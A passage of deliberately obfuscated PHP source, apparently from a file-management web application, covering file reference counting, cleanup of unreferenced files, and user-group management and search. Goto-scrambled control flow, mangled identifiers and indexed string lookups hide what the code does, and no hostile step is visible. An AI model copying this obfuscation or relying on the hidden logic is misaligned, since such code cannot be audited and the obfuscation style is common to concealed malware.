dàêÓŠŸ‡: $BÌƒ—ãÃÍ¾ =& $_SERVER[¯Ò¬Èè]; $B³Í‚‡¦Ñ = $this->createFileName($C‚–©’Ï); $B©âíªˆ¹â = get_path_father($B³Í‚‡¦Ñ); goto Eİµ•ÌÙÔ‚; f‡’©ğ£åœ: } public function addFileCheckExist($B“ëÔªƒù, $câÃóë¤, $fö¾‘â’ß) { $B‰ËÛá‰ÔÊ =& $_SERVER[¯Ò¬Èè]; $b³œ´ä „ = $this->findByHash($B“ëÔªƒù, $câÃóë¤); if (!$b³œ´ä „) { return !1; } $eï”Ó”¢­” = array($B‰ËÛá‰ÔÊ[2168] => intval($b³œ´ä „[$B‰ËÛá‰ÔÊ[2171]]) + 1, $B‰ËÛá‰ÔÊ[529] => $fö¾‘â’ß); $this->where(array($B‰ËÛá‰ÔÊ[420] => $b³œ´ä „[$B‰ËÛá‰ÔÊ[419]]))->save($eï”Ó”¢­”); return $b³œ´ä „; } public function remove($Bù¡„ªöß) { $this->linkCountChange($Bù¡„ªöß, !1); $this->clearEmpty(); return !0; } public function linkAdd($a¥ÌÆ¶Ì†â) { $this->linkCountChange($a¥ÌÆ¶Ì†â, !0); } public function linkCountChange($B‘Š¼ÆĞ¼¤, $A¿é¢µ¨È) { goto b»ˆƒ¢­‘; aßŠŠ·Ùº¹: $AÍ®ØÅ«î = array(); foreach ($B‘Š¼ÆĞ¼¤ as $a÷¢‘Šã) { $FÎµªÁâè» = $a÷¢‘Šã . $FæĞô™ªŸù[33]; if (!$AÍ®ØÅ«î[$FÎµªÁâè»]) { $AÍ®ØÅ«î[$FÎµªÁâè»] = 0; } $AÍ®ØÅ«î[$FÎµªÁâè»]++; } $cÀ¦ÁçâÀ = array(); goto CˆŒæğÍ¥ö; b»ˆƒ¢­‘: $FæĞô™ªŸù =& $_SERVER[¯Ò¬Èè]; if (!$B‘Š¼ÆĞ¼¤) { return; } if (!is_array($B‘Š¼ÆĞ¼¤)) { $B‘Š¼ÆĞ¼¤ = array($B‘Š¼ÆĞ¼¤); } goto aßŠŠ·Ùº¹; CˆŒæğÍ¥ö: foreach ($AÍ®ØÅ«î as $a÷¢‘Šã => $eß•á‰ƒÖ¿) { $FÎµªÁâè» = $eß•á‰ƒÖ¿ . $FæĞô™ªŸù[33]; if (!$cÀ¦ÁçâÀ[$FÎµªÁâè»]) { $cÀ¦ÁçâÀ[$FÎµªÁâè»] = array(); } $cÀ¦ÁçâÀ[$FÎµªÁâè»][] = $a÷¢‘Šã; } foreach ($cÀ¦ÁçâÀ as $eß•á‰ƒÖ¿ => $D¤êµ´) { if (!$D¤êµ´) { continue; } $eß•á‰ƒÖ¿ = $A¿é¢µ¨È ? $eß•á‰ƒÖ¿ : -intval($eß•á‰ƒÖ¿); $c¶ğ™´“¤õ = array($FæĞô™ªŸù[419] => array($FæĞô™ªŸù[7], $D¤êµ´)); if ($eß•á‰ƒÖ¿ < 0) { $c¶ğ™´“¤õ[$FæĞô™ªŸù[2171]] = array($FæĞô™ªŸù[938], abs($eß•á‰ƒÖ¿)); } $this->where($c¶ğ™´“¤õ)->setAdd($FæĞô™ªŸù[2171], $eß•á‰ƒÖ¿); } goto eã­ÈÑçÅ; eã­ÈÑçÅ: } public function findByHash($e±ñ²ªêÚ, $b›‡Èƒ…… = false) { $Eî ª‹¿” =& $_SERVER[¯Ò¬Èè]; if (!$e±ñ²ªêÚ && !$b›‡Èƒ……) { return !1; } $cÏ…¹”—´è = array($Eî ª‹¿”[2169] => $e±ñ²ªêÚ); if ($b›‡Èƒ……) { $cÏ…¹”—´è = array($Eî ª‹¿”[2170] => $b›‡Èƒ……); } return $this->order($Eî ª‹¿”[2172])->where($cÏ…¹”—´è)->find(); } public function clearEmpty($fó¢Í¢šæî = 0) { goto aä›¯µ²„«; aä›¯µ²„«: $Dàñ©‰ÍŒ¬ =& $_SERVER[¯Ò¬Èè]; $D™¸®‘Ü = time() - 3600 * 24 * $fó¢Í¢šæî; $eÊ‡ÀôÔñ = $Dàñ©‰ÍŒ¬[2173] . $D™¸®‘Ü; goto f®ŠÂ«Ğö; f®ŠÂ«Ğö: $D†ŠÓ¾í = $this->where($eÊ‡ÀôÔñ)->select(); if (!$D†ŠÓ¾í) { return; } $DéçÑ‰«ù¤ = new Task($Dàñ©‰ÍŒ¬[2174], $Dàñ©‰ÍŒ¬[33], count($D†ŠÓ¾í)); goto e”‡Ö«×Ó‡; e”‡Ö«×Ó‡: foreach ($D†ŠÓ¾í as $dÅ·Éß…ˆ—) { $DéçÑ‰«ù¤->update(1); $this->resetFile($dÅ·Éß…ˆ—); } $DéçÑ‰«ù¤->end(); goto c®ğ«øŸ’á; c®ğ«øŸ’á: } private function resetFile($DÀ»ƒÙÚÃÕ) { goto Bø¿©°øÌÔ; BÉñã¸ÊÏ: if ($DÀ»ƒÙÚÃÕ[$Bº“‹ãŸ÷Ö[2171]] != $fÌ°®ñå”Ş) { $this->where($cŠŒƒÄà§¼)->save(array($Bº“‹ãŸ÷Ö[2168] => $fÌ°®ñå”Ş)); } goto aÖŒ“˜‹¤³; Bø¿©°øÌÔ: $Bº“‹ãŸ÷Ö =& $_SERVER[¯Ò¬Èè]; $cŠŒƒÄà§¼ = array($Bº“‹ãŸ÷Ö[420] => $DÀ»ƒÙÚÃÕ[$Bº“‹ãŸ÷Ö[419]]); $F­ó„ÙÈÙŠ = Model($Bº“‹ãŸ÷Ö[1126])->where($cŠŒƒÄà§¼)->count(); goto Eì¬Ü‰£›¶; Eì¬Ü‰£›¶: $A‹½šæ‘ = Model($Bº“‹ãŸ÷Ö[2175])->where($cŠŒƒÄà§¼)->count(); $fÌ°®ñå”Ş = intval($F­ó„ÙÈÙŠ) + intval($A‹½šæ‘); if ($fÌ°®ñå”Ş == 0) { IO::remove($DÀ»ƒÙÚÃÕ[$Bº“‹ãŸ÷Ö[75]]); $this->where($cŠŒƒÄà§¼)->delete(); $this->metaSet($DÀ»ƒÙÚÃÕ[$Bº“‹ãŸ÷Ö[419]], null, null); return; } goto BÉñã¸ÊÏ; aÖŒ“˜‹¤³: } public function storageInfo($fõ‘ö÷°ñ = false) { goto bÖ¨§—†; f÷Âµ³»»£: $eÆ½ºëÎØ = 1; $Då©ÍŞò¶³ = 0; $c„»¤éª„Õ = 5000; goto B¶›Ğ£¶µ; bÖ¨§—†: $fß„ŞÎ…Ô“ =& $_SERVER[¯Ò¬Èè]; $fğ‹–²œòˆ = $this->count() + 0.0; $b×¶­ïé®˜ = 0; goto f÷Âµ³»»£; B¶›Ğ£¶µ: for ($C™Ó¹èµ—ª = 0; $C™Ó¹èµ—ª < $fğ‹–²œòˆ; $C™Ó¹èµ—ª = $C™Ó¹èµ—ª + $c„»¤éª„Õ) { $A²¢¢Ü±ç‘ = $this->limit($C™Ó¹èµ—ª, $C™Ó¹èµ—ª + $c„»¤éª„Õ)->select(); foreach ($A²¢¢Ü±ç‘ as $e¹×‹Úïğ¹) { $eÆ½ºëÎØ += $e¹×‹Úïğ¹[$fß„ŞÎ…Ô“[77]] * $e¹×‹Úïğ¹[$fß„ŞÎ…Ô“[2171]]; $b×¶­ïé®˜ += $e¹×‹Úïğ¹[$fß„ŞÎ…Ô“[77]] * ($e¹×‹Úïğ¹[$fß„ŞÎ…Ô“[2171]] - 1); $Då©ÍŞò¶³ += $e¹×‹Úïğ¹[$fß„ŞÎ…Ô“[2171]]; } } $Fß¦¯ŠŸÚ = array($fß„ŞÎ…Ô“[2176] => $eÆ½ºëÎØ, $fß„ŞÎ…Ô“[2177] => $b×¶­ïé®˜, $fß„ŞÎ…Ô“[2178] => $b×¶­ïé®˜ / $eÆ½ºëÎØ, $fß„ŞÎ…Ô“[81] => $fğ‹–²œòˆ, $fß„ŞÎ…Ô“[2179] => $Då©ÍŞò¶³); return $Fß¦¯ŠŸÚ; goto cÕ©Ğó„²…; cÕ©Ğó„²…: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\145" => "\147\x72\x6f\x75\x70\x5f\x6d\x65\x74\141", "\155\x65\x74\x61\x46\x69\x65\154\144" => "\x67\162\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($F‘éè¾Òª†) { $B“éÙÑ¤Œ =& $_SERVER[¯Ò¬Èè]; return array($B“éÙÑ¤Œ[2180] => array($F‘éè¾Òª†[0], $B“éÙÑ¤Œ[2181]), $B“éÙÑ¤Œ[2182] => array($F‘éè¾Òª†[0], $B“éÙÑ¤Œ[2181])); } protected function getInfo($DçİÏ½È½) { $B¼›Ê¦İ¹‡ = $this->getInfoSimple($DçİÏ½È½); if (!$B¼›Ê¦İ¹‡) { return !1; } return $this->_listDataApplyItem($B¼›Ê¦İ¹‡); } protected function getInfoSimple($eÈ Ë‰´‘Õ, $Bââ‡Í„…å = false) { $F›‘ô„Õ¯˜ =& $_SERVER[¯Ò¬Èè]; if ($Bââ‡Í„…å) { $a©ğ¥Ó²ƒ¿ = array($F›‘ô„Õ¯˜[2114] => intval($eÈ Ë‰´‘Õ)); $Eƒ›İøœèä = $this->where($a©ğ¥Ó²ƒ¿)->find(); return is_array($Eƒ›İøœèä) ? $Eƒ›İøœèä : array(); } return $this->cacheFunctionGet($F›‘ô„Õ¯˜[2183], $eÈ Ë‰´‘Õ); } protected function groupAdd($bôÇÈßÖÅ) { goto d¶¨Ç†‡Ï™; d¶¨Ç†‡Ï™: $Fˆ¹•éĞ­¤ =& $_SERVER[¯Ò¬Èè]; if (!$bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[461]] && isset($bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2114]]) && $bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2114]] == 1) { if ($f¢ÅŞñçÁ = $this->getInfoSimple($bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2114]], !0)) { return $bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2114]]; } } else { $f¢ÅŞñçÁ = $this->getInfoSimple($bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[461]]); if (!$f¢ÅŞñçÁ) { return !1; } } $aŸ¢³’ñÕ = $Fˆ¹•éĞ­¤[470]; goto Bƒù¦‘Í‡±; F… ø—ÃŠÏ: Model($Fˆ¹•éĞ­¤[1126])->groupRootAdd($FÙÎ¡ˆÜö–); return $FÙÎ¡ˆÜö–; goto aš˜‚æ¬†Â; Bƒù¦‘Í‡±: if ($f¢ÅŞñçÁ[$Fˆ¹•éĞ­¤[459]]) { $aŸ¢³’ñÕ = $f¢ÅŞñçÁ[$Fˆ¹•éĞ­¤[459]] . $f¢ÅŞñçÁ[$Fˆ¹•éĞ­¤[2114]] . $Fˆ¹•éĞ­¤[47]; } $b³ÈóË½§  = array($Fˆ¹•éĞ­¤[386] => $this->groupNameAuto($bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[461]], $bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[28]]), $Fˆ¹•éĞ­¤[368] => $bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[461]], $Fˆ¹•éĞ­¤[534] => $aŸ¢³’ñÕ, $Fˆ¹•éĞ­¤[2184] => $bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2098]], $Fˆ¹•éĞ­¤[2185] => 0, $Fˆ¹•éĞ­¤[2118] => 0); if (isset($bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2135]])) { $b³ÈóË½§ [$Fˆ¹•éĞ­¤[2135]] = $bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2135]]; } else { $Bä®§‘‹š´ = $this->max($Fˆ¹•éĞ­¤[2135]); if (!$Bä®§‘‹š´) { $Bä®§‘‹š´ = 0; } $b³ÈóË½§ [$Fˆ¹•éĞ­¤[2135]] = $Bä®§‘‹š´ + 1; } goto fˆçòô’„Á; fˆçòô’„Á: if (!empty($bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2114]])) { $b³ÈóË½§ [$Fˆ¹•éĞ­¤[2114]] = $bôÇÈßÖÅ[$Fˆ¹•éĞ­¤[2114]]; } $FÙÎ¡ˆÜö– = $this->add($b³ÈóË½§ ); $this->setNamePinyin($FÙÎ¡ˆÜö–, $b³ÈóË½§ [$Fˆ¹•éĞ­¤[28]]); goto F… ø—ÃŠÏ; aš˜‚æ¬†Â: } protected function groupEdit($f†‹íÆ‹­ì, $bğ‡Œä–È¸) { $bÏˆ¸ ‹ =& $_SERVER[¯Ò¬Èè]; if (!empty($bğ‡Œä–È¸[$bÏˆ¸ ‹[461]])) { $cë¹˜–Õ×­ = $this->getInfoSimple($f†‹íÆ‹­ì); $B–ÓĞö’¥» = $this->getInfoSimple($bğ‡Œä–È¸[$bÏˆ¸ ‹[461]]); if (!$cë¹˜–Õ×­ || !$B–ÓĞö’¥») { return !1; } if ($cë¹˜–Õ×­[$bÏˆ¸ ‹[2114]] == $B–ÓĞö’¥»[$bÏˆ¸ ‹[2114]]) { return !1; } if ($bğ‡Œä–È¸[$bÏˆ¸ ‹[461]] != $cë¹˜–Õ×­[$bÏˆ¸ ‹[461]]) { if ($B–ÓĞö’¥»[$bÏˆ¸ ‹[459]] !== $cë¹˜–Õ×­[$bÏˆ¸ ‹[459]] && strpos($B–ÓĞö’¥»[$bÏˆ¸ ‹[459]], $cë¹˜–Õ×­[$bÏˆ¸ ‹[459]] . $cë¹˜–Õ×­[$bÏˆ¸ ‹[2114]] . $bÏˆ¸ ‹[47]) === 0) { return !1; } $bğ‡Œä–È¸[$bÏˆ¸ ‹[534]] = $B–ÓĞö’¥»[$bÏˆ¸ ‹[459]] . $bğ‡Œä–È¸[$bÏˆ¸ ‹[461]] . $bÏˆ¸ ‹[47]; $this->_changeChildLevel($cë¹˜–Õ×­, $B–ÓĞö’¥»); } } if (isset($bğ‡Œä–È¸[$bÏˆ¸ ‹[28]])) { $this->setNamePinyin($f†‹íÆ‹­ì, $bğ‡Œä–È¸[$bÏˆ¸ ‹[28]]); } return $this->where(array($bÏˆ¸ ‹[2186] => $f†‹íÆ‹­ì))->save($bğ‡Œä–È¸); } private function _changeChildLevel($B½ÂÀî‘Íù, $A´‰˜ïé¡ˆ, $CÍ½Í¬†¡ = false) { goto D‹™Ú‰•Ü¿; c®ä´àË‹: $this->where($E…¤Œ§“Œ­)->data($D„Ü°ã‹Ñ)->save(); goto e°§öÃ¨; b³Ï­ê¡¬: if ($CÍ½Í¬†¡) { $a•‡‡„ŸÅĞ = $A´‰˜ïé¡ˆ[$E˜”ÁÅ‚²[459]] . $A´‰˜ïé¡ˆ[$E˜”ÁÅ‚²[2114]] . $E˜”ÁÅ‚²[47]; } $E…¤Œ§“Œ­ = array($E˜”ÁÅ‚²[534] => array($E˜”ÁÅ‚²[483], $B½ÂÀî‘Íù[$E˜”ÁÅ‚²[459]] . $B½ÂÀî‘Íù[$E˜”ÁÅ‚²[2114]] . $E˜”ÁÅ‚²[484])); $D„Ü°ã‹Ñ = array($E˜”ÁÅ‚²[534] => array($E˜”ÁÅ‚²[543], "\x72\x65\160\154\x61\x63\145\x28\160\141\162\145\x6e\164\114\x65\166\x65\154\54\47{$BÓ‚íòÜƒî}\47\x2c\47{$a•‡‡„ŸÅĞ}\x27\x29")); goto c®ä´àË‹; D‹™Ú‰•Ü¿: $E˜”ÁÅ‚² =& $_SERVER[¯Ò¬Èè]; $BÓ‚íòÜƒî = $B½ÂÀî‘Íù[$E˜”ÁÅ‚²[459]] . $B½ÂÀî‘Íù[$E˜”ÁÅ‚²[2114]] . $E˜”ÁÅ‚²[47]; $a•‡‡„ŸÅĞ = $A´‰˜ïé¡ˆ[$E˜”ÁÅ‚²[459]] . $A´‰˜ïé¡ˆ[$E˜”ÁÅ‚²[2114]] . $E˜”ÁÅ‚²[47] . $B½ÂÀî‘Íù[$E˜”ÁÅ‚²[2114]] . $E˜”ÁÅ‚²[47]; goto b³Ï­ê¡¬; e°§öÃ¨: } public function setNamePinyin($c¼˜í°É‡, $B¤±Ó¸Ë”© = false) { $a©Ø‹ìÍ±‚ =& $_SERVER[¯Ò¬Èè]; if (!$B¤±Ó¸Ë”©) { $EŸÜ‹ĞøÙÁ = $this->getInfoSimple($c¼˜í°É‡); $B¤±Ó¸Ë”© = $EŸÜ‹ĞøÙÁ[$a©Ø‹ìÍ±‚[28]]; } if (!Input::check($B¤±Ó¸Ë”©, $a©Ø‹ìÍ±‚[537])) { $this->metaSet($c¼˜í°É‡, $a©Ø‹ìÍ±‚[416], null); $this->metaSet($c¼˜í°É‡, $a©Ø‹ìÍ±‚[415], null); return; } $a±ò‘‰ôêö = array($a©Ø‹ìÍ±‚[416] => str_replace($a©Ø‹ìÍ±‚[50], $a©Ø‹ìÍ±‚[33], Pinyin::encode($B¤±Ó¸Ë”©)), $a©Ø‹ìÍ±‚[415] => Pinyin::encode($B¤±Ó¸Ë”©, $a©Ø‹ìÍ±‚[538])); $this->metaSet($c¼˜í°É‡, $a±ò‘‰ôêö); } protected function groupStatus($AÀ…¢¼×‚, $eºÍ¿¼ä×Ò) { goto b« °£öí¯; e–ğõ¨†¼‰: if ($eºÍ¿¼ä×Ò == $DŸŒÁ¤‹¥[83]) { $CòŸŸŠßÊÄ = $this->parentLevelArray($e¹ÀË‚šŞ¯[$DŸŒÁ¤‹¥[459]]); } else { $eÎ â‘ÁÛá = array($DŸŒÁ¤‹¥[534] => array($DŸŒÁ¤‹¥[483], $e¹ÀË‚šŞ¯[$DŸŒÁ¤‹¥[459]] . $e¹ÀË‚šŞ¯[$DŸŒÁ¤‹¥[2114]] . $DŸŒÁ¤‹¥[484])); $CòŸŸŠßÊÄ = $this->where($eÎ â‘ÁÛá)->field($DŸŒÁ¤‹¥[2114])->select(); $CòŸŸŠßÊÄ = array_to_keyvalue($CòŸŸŠßÊÄ, $DŸŒÁ¤‹¥[33], $DŸŒÁ¤‹¥[2114]); } $CòŸŸŠßÊÄ[] = $e¹ÀË‚šŞ¯[$DŸŒÁ¤‹¥[2114]]; $E‹‚­¯‚‹ = array(); goto aµÙãÊ÷Åñ; aµÙãÊ÷Åñ: foreach ($CòŸŸŠßÊÄ as $AÀ…¢¼×‚) { $E‹‚­¯‚‹[] = array($DŸŒÁ¤‹¥[2114] => $AÀ…¢¼×‚, $DŸŒÁ¤‹¥[89] => $DŸŒÁ¤‹¥[703], $DŸŒÁ¤‹¥[359] => $eºÍ¿¼ä×Ò); } return Model($DŸŒÁ¤‹¥[2187])->addAll($E‹‚­¯‚‹, array(), !0); goto e©òÕªÄ ; b« °£öí¯: $DŸŒÁ¤‹¥ =& $_SERVER[¯Ò¬Èè]; $e¹ÀË‚šŞ¯ = $this->getInfoSimple($AÀ…¢¼×‚); if (!$e¹ÀË‚šŞ¯) { return !1; } goto e–ğõ¨†¼‰; e©òÕªÄ : } private function _groupStatusApply($Bå÷ÍÂ½»Û, $cìé†«¸ó) { $b°‹°†Â¸ =& $_SERVER[¯Ò¬Èè]; if ($cìé†«¸ó == $b°‹°†Â¸[83]) { $e·‘¨¨¼õ = $this->parentLevelArray($Bå÷ÍÂ½»Û[$b°‹°†Â¸[459]]); } else { $aóÚ±‡Î‰„ = array($b°‹°†Â¸[534] => array($b°‹°†Â¸[483], $Bå÷ÍÂ½»Û[$b°‹°†Â¸[459]] . $Bå÷ÍÂ½»Û[$b°‹°†Â¸[2114]] . $b°‹°†Â¸[484])); $e·‘¨¨¼õ = $this->where($aóÚ±‡Î‰„)->field($b°‹°†Â¸[2114])->select(); $e·‘¨¨¼õ = array_to_keyvalue($e·‘¨¨¼õ, $b°‹°†Â¸[33], $b°‹°†Â¸[2114]); } if (empty($e·‘¨¨¼õ)) { return; } $CÍî£Ä¯»­ = array(); foreach ($e·‘¨¨¼õ as $C×İÒºÎ) { $CÍî£Ä¯»­[] = array($b°‹°†Â¸[2114] => $C×İÒºÎ, $b°‹°†Â¸[89] => $b°‹°†Â¸[703], $b°‹°†Â¸[359] => $cìé†«¸ó); } Model($b°‹°†Â¸[2187])->addAll($CÍî£Ä¯»­, array(), !0); } protected function groupRemove($d¶×ñÓˆÙÄ) { goto f££—†éñã; f££—†éñã: $aô‹ˆçäàƒ =& $_SERVER[¯Ò¬Èè]; $CÚÒ¨é‰•æ = array($aô‹ˆçäàƒ[2114] => $d¶×ñÓˆÙÄ); $AÆˆÖš®ˆƒ = $this->where($CÚÒ¨é‰•æ)->find(); goto cÜ‹—¡ªîò; dÄä©”ŞÛ: $this->where(array($aô‹ˆçäàƒ[461] => $d¶×ñÓˆÙÄ))->save(array($aô‹ˆçäàƒ[461] => $AÆˆÖš®ˆƒ[$aô‹ˆçäàƒ[461]])); Model($aô‹ˆçäàƒ[2187])->where($CÚÒ¨é‰•æ)->delete(); Model($aô‹ˆçäàƒ[2188])->where($CÚÒ¨é‰•æ)->delete(); goto eÆÄˆŒÛÁ÷; cÜ‹—¡ªîò: if (!$AÆˆÖš®ˆƒ || $AÆˆÖš®ˆƒ[$aô‹ˆçäàƒ[461]] == 0) { return !1; } $e³ÜÇ„©ã† = $this->getInfoSimple($AÆˆÖš®ˆƒ[$aô‹ˆçäàƒ[461]]); $this->_changeChildLevel($AÆˆÖš®ˆƒ, $e³ÜÇ„©ã†, !0); goto dÄä©”ŞÛ; eÆÄˆŒÛÁ÷: Model($aô‹ˆçäàƒ[767])->groupRootRemove($d¶×ñÓˆÙÄ); return $this->where($CÚÒ¨é‰•æ)->delete(); goto eÇÚ†‘™Ù; eÇÚ†‘™Ù: } protected function groupSort($Aè†¢Ğ¹¥Ö) { $ešùÙ˜½‘Å =& $_SERVER[¯Ò¬Èè]; $CÊ½˜ÂÒ…™ = array(); foreach ($Aè†¢Ğ¹¥Ö as $bÔÔÒŸÚÓ => $C±ËÒÅÀï) { $CÊ½˜ÂÒ…™[] = array($ešùÙ˜½‘Å[2114], $C±ËÒÅÀï, $ešùÙ˜½‘Å[2135], $bÔÔÒŸÚÓ + 1); } $this->saveAll($CÊ½˜ÂÒ…™); } public function listData() { $eŞïª›ó¶£ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eŞïª›ó¶£[$_SERVER[¯Ò¬Èè][354]]); return $eŞïª›ó¶£; } private function _makeOrder($eÜ¨²ë µ = '') { goto F•Ó½­ê·ø; F•Ó½­ê·ø: $eÉ½‰¾ˆÄ =& $_SERVER[¯Ò¬Èè]; $BÄŒŒº½çÌ = array($eÉ½‰¾ˆÄ[2114], $eÉ½‰¾ˆÄ[28], $eÉ½‰¾ˆÄ[2100], $eÉ½‰¾ˆÄ[187]); $B†‰ŞÏ­¼ê = array($eÉ½‰¾ˆÄ[402] => $eÉ½‰¾ˆÄ[403], $eÉ½‰¾ˆÄ[404] => $eÉ½‰¾ˆÄ[405]); goto C’ö¨¾Ç¹; C’ö¨¾Ç¹: $cŠÛ÷ØÏ¦ˆ = Input::get($eÉ½‰¾ˆÄ[407], $eÉ½‰¾ˆÄ[7], $eÉ½‰¾ˆÄ[2118], $BÄŒŒº½çÌ); $e‰œõÎ…¾Ò = Input::get($eÉ½‰¾ˆÄ[408], $eÉ½‰¾ˆÄ[7], $eÉ½‰¾ˆÄ[2189], array($eÉ½‰¾ˆÄ[2189], $eÉ½‰¾ˆÄ[404])); $e‰œõÎ…¾Ò = $B†‰ŞÏ­¼ê[$e‰œõÎ…¾Ò]; goto bòºñæÑÄ; bòºñæÑÄ: $eÜ¨²ë µ = $eÜ¨²ë µ . "{$cŠÛ÷ØÏ¦ˆ}\40{$e‰œõÎ…¾Ò}\x2c\40\x67\x72\x6f\x75\160\x49\104\40\141\163\x63"; return $this->order($eÜ¨²ë µ); goto E‚’¨À„ª ; E‚’¨À„ª : } public function listChild($b‘ŒÂÁñ…) { $d¶ß›ö¡®è =& $_SERVER[¯Ò¬Èè]; $EÔ‡ˆ‹È¼ó = $this->where(array($d¶ß›ö¡®è[461] => $b‘ŒÂÁñ…))->_makeOrder()->selectPage(200); $this->_listDataApply($EÔ‡ˆ‹È¼ó[$d¶ß›ö¡®è[354]]); return $EÔ‡ˆ‹È¼ó; } public function listByID($cŸ–­àÎĞ) { $Fì”›Õœ¦Ğ =& $_SERVER[¯Ò¬Èè]; if (!$cŸ–­àÎĞ) { return array(); } $fÆ ƒíØù = array($Fì”›Õœ¦Ğ[2114] => array($Fì”›Õœ¦Ğ[7], $cŸ–­àÎĞ)); $C„Ç¦ÍÜ‚ = $this->where($fÆ ƒíØù)->select(); $this->_listDataApply($C„Ç¦ÍÜ‚); return $C„Ç¦ÍÜ‚; } public function listSearch($D‘¯ğ®±À) { goto A‘º¥»¬Ï•; AÁâ’¦è : $c«Ã¨‘‚¸ = $this->_makeOrder()->where($BŞ¼•ÂíÚ)->selectPage(20); $c«Ã¨‘‚¸ = $c«Ã¨‘‚¸ ? $c«Ã¨‘‚¸ : array(); if (!$c«Ã¨‘‚¸ || count($c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[354]]) < 5 && Input::check($dÙñªÕ¦“, $aÚŞ÷ÁŞ’Š[306])) { $A‡´±ó•îµ = $this->_searchFromMeta($aÚŞ÷ÁŞ’Š[415], $dÙñªÕ¦“, 10); $e £¿Ó‡Ú = $this->_searchFromMeta($aÚŞ÷ÁŞ’Š[416], $dÙñªÕ¦“, 10); $F’ÏÙ‡™ÂŠ = array_merge($A‡´±ó•îµ, $e £¿Ó‡Ú, $c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[354]]); $c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[354]] = array_unique_by_key($F’ÏÙ‡™ÂŠ, $aÚŞ÷ÁŞ’Š[2114]); $c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[351]][$aÚŞ÷ÁŞ’Š[352]] = count($c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[354]]); $c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[351]][$aÚŞ÷ÁŞ’Š[353]] = ceil($c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[351]][$aÚŞ÷ÁŞ’Š[352]] / $c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[351]][$aÚŞ÷ÁŞ’Š[349]]); } goto c¡òÜè²§Ë; A‘º¥»¬Ï•: $aÚŞ÷ÁŞ’Š =& $_SERVER[¯Ò¬Èè]; $dÙñªÕ¦“ = $D‘¯ğ®±À[$aÚŞ÷ÁŞ’Š[2190]]; $C—¦™¬ã™” = isset($D‘¯ğ®±À[$aÚŞ÷ÁŞ’Š[2191]]) ? $D‘¯ğ®±À[$aÚŞ÷ÁŞ’Š[2191]] : !1; goto aµøÄÓğÎ§; c¡òÜè²§Ë: $this->_listDataApply($c«Ã¨‘‚¸[$aÚŞ÷ÁŞ’Š[354]]); return $c«Ã¨‘‚¸; goto CìïÏŒŒ“‰; aµøÄÓğÎ§: if (!trim($dÙñªÕ¦“)) { return !1; } $dÙñªÕ¦“ = str_replace($aÚŞ÷ÁŞ’Š[2192], $aÚŞ÷ÁŞ’Š[2193], $dÙñªÕ¦“); $BŞ¼•ÂíÚ = array($aÚŞ÷ÁŞ’Š[2114] => array($aÚŞ÷ÁŞ’Š[766], "\x25{$dÙñªÕ¦“}\x25"), $aÚŞ÷ÁŞ’Š[28] => array($aÚŞ÷ÁŞ’Š[766], "\45{$dÙñªÕ¦“}\45"), $aÚŞ÷ÁŞ’Š[923] => $aÚŞ÷ÁŞ’Š[2194]); goto AÁâ’¦è ; CìïÏŒŒ“‰: } private function _searchFromMeta($b˜Ò›ãŠÙ, $F‡“ß×¸®, $BàÀùË¡ñ­) { goto AéˆÜ…ÌÄ”; AéˆÜ…ÌÄ”: $AåùÉÛˆæå =& $_SERVER[¯Ò¬Èè]; $F‡“ß×¸® = strtolower($F‡“ß×¸®); $f®£„ÎïÔä = array($AåùÉÛˆæå[89] => $b˜Ò›ãŠÙ, $AåùÉÛˆæå[359] => array($AåùÉÛˆæå[766], "\45{$F‡“ß×¸®}\45")); goto EßÎ¶Íš©; EßÎ¶Íš©: $E»ƒáÄ°ªÆ = Model($AåùÉÛˆæå[2195])->where($f®£„ÎïÔä)->limit($BàÀùË¡ñ­)->select(); if (!$E»ƒáÄ°ªÆ) { return array(); } $E»ƒáÄ°ªÆ = array_to_keyvalue($E»ƒáÄ°ªÆ, $AåùÉÛˆæå[33], $AåùÉÛˆæå[2114]); goto cÆ©çóÌ¹®; cÆ©çóÌ¹®: $b¡ÑÖí–Ş– = $this->where(array($AåùÉÛˆæå[2186] => array($AåùÉÛˆæå[7], $E»ƒáÄ°ªÆ)))->select(); if (!$b¡ÑÖí–Ş–) { return array(); } return $b¡ÑÖí–Ş–; goto c¼¬±å™Ù; c¼¬±å™Ù: } protected function _listDataApplyItem($f˜¦…‰›æ) { $CìÙ·×·ƒË = array($f˜¦…‰›æ); $this->_listDataApply($CìÙ·×·ƒË); return $CìÙ·×·ƒË[0]; } protected function _listDataApply(&$fˆÓ¼øô‚Ó) { goto cŒÄÅŞËƒ¨; B¤ÎšÑ³í: $this->_listAppendChildren($fˆÓ¼øô‚Ó); $this->_listAppendChildrenMember($fˆÓ¼øô‚Ó); $this->_listAppendMeta($fˆÓ¼øô‚Ó, $Cñ®ØŸîÏì); goto DóÅ¸Æ›­Ç; cŒÄÅŞËƒ¨: $d£«…åŞ =& $_SERVER[¯Ò¬Èè]; if (!$fˆÓ¼øô‚Ó) { return; } $Cñ®ØŸîÏì = array_to_keyvalue($fˆÓ¼øô‚Ó, $d£«…åŞ[33], $d£«…åŞ[2114]); goto B¤ÎšÑ³í; DóÅ¸Æ›­Ç: $this->_listAppendParent($fˆÓ¼øô‚Ó); $this->_listAppendSourceRoot($fˆÓ¼øô‚Ó, $Cñ®ØŸîÏì); goto 